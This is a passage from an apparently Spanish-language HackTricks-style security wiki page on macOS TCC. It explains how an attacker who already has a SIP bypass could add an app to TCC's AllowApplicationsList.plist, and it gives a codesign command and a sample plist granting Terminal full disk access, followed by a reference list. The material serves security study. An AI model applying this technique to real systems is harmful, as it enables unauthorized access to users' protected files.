Sin embargo, hay otra opción para abusar de este **SIP bypass y omitir TCC**: el archivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` es una lista de aplicaciones permitidas que requieren una excepción de TCC. Por lo tanto, si un atacante puede **eliminar la protección SIP** de este archivo y añadir su **propia aplicación**, esta podrá omitir TCC.\
Por ejemplo, para añadir Terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [Análisis profundo de macOS TCC.db - Blog de Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script para rastrear com.apple.macl (Gist de brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Rastrear y abordar com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Elusión de las protecciones de privacidad del usuario de macOS TCC por accidente y por diseño](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Cambiar el directorio de inicio y eludir TCC, también conocido como CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [SQL Injection en TCC: y por qué (probablemente) no fue un riesgo de seguridad (esta vez)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [Ubicación y adquisición de TCC.db en macOS](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [Configuración de macOS App Sandbox](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Entitlement de cámara](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Configuración de la carga útil de Privacy Preferences Policy Control para la administración de dispositivos Apple](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Análisis de una intrusión en macOS, desde el señuelo hasta el compromiso](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
